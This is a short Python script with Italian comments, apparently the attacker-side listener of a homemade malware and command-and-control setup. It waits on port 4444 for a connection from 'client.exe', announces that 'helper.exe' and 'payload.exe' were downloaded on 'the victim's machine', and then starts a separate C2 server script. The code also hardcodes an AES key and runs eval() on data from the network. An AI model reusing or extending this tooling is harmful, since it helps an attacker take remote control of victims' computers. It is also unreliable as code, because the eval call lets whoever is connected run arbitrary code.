import socket
import os
from Crypto.Cipher import AES

key = b's1cur3zz4pr1v4cy' # chiave crittografica

#algoritmi per crittografare e decrittografare i messaggi

def encrypt_msg(msg):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext = cipher.encrypt(msg.encode())
    c_msg = []
    c_msg.append(ciphertext)
    c_msg.append(nonce)
    return str(c_msg).encode('utf-8')
    
def decrypt_msg(msg):
    msg_pack = eval(msg.decode('utf-8'))
    nonce = msg_pack[1]
    cipher = AES.new(key, AES.MODE_EAX, nonce)    
    d_msg = cipher.decrypt(msg_pack[0])
    return d_msg.decode()
    
SERVER_HOST = '192.168.1.53' # indirizzo IP del server 
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
# creo il socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!") #comunico che client.exe è stato avviato

# chiudo la connessione alla porta 4444 perché non serve più
s.close()

print(" ☠ helper.exe AND payload.exe HAVE BEEN CORRECTLY DOWNLOADED ON THE VICTIM'S MACHINE ☠")
print(" ☠                RUNNING PAYLOAD NOW, LISTENING AT 192.168.1.40:5555                ☠")

os.system("python exploit_server.py") # chiamo il vero server C2
